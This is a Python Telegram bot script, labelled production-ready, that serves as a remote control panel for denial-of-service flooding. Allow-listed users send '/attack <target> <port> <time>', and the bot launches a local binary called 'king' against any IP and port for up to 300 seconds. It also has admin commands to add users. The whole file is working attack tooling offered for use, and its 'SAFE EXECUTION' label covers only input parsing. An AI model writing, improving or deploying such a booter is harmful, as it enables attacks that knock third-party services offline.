# =========================
# bot.py (PRODUCTION READY)
# =========================

import os
import telebot
import subprocess
import datetime

TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    raise ValueError("BOT_TOKEN not set")

bot = telebot.TeleBot(TOKEN)

ADMIN_IDS = {"5365352961"}
USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Ensure files exist
for f in [USER_FILE, LOG_FILE]:
    if not os.path.exists(f):
        open(f, "w").close()

# Load users
def load_users():
    with open(USER_FILE) as f:
        return set(f.read().splitlines())

allowed_users = load_users()

# Logging
def log(user_id, cmd):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} | {user_id} | {cmd}\n")

# Start
@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "Bot is running ✅")

# Add user
@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_IDS:
        return bot.reply_to(msg, "Unauthorized")

    parts = msg.text.split()
    if len(parts) != 2:
        return bot.reply_to(msg, "Usage: /add <userid>")

    new_user = parts[1]
    allowed_users.add(new_user)

    with open(USER_FILE, "a") as f:
        f.write(new_user + "\n")

    bot.reply_to(msg, f"Added {new_user}")

# Attack (SAFE EXECUTION)
@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    if uid not in allowed_users:
        return bot.reply_to(msg, "Access denied")

    parts = msg.text.split()
    if len(parts) != 4:
        return bot.reply_to(msg, "Usage: /attack <target> <port> <time>")

    target = parts[1]

    try:
        port = int(parts[2])
        duration = int(parts[3])
    except:
        return bot.reply_to(msg, "Invalid input")

    if duration > 300:
        return bot.reply_to(msg, "Max time = 300")

    bot.reply_to(msg, f"Attack started on {target}:{port}")

    script_dir = os.path.dirname(os.path.abspath(__file__))
    binary = os.path.join(script_dir, "king")

    try:
        subprocess.Popen([binary, target, str(port), str(duration), "100"])
    except Exception as e:
        bot.reply_to(msg, f"Execution error: {e}")

    log(uid, msg.text)

# Safe polling loop
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print("Bot crashed:", e)


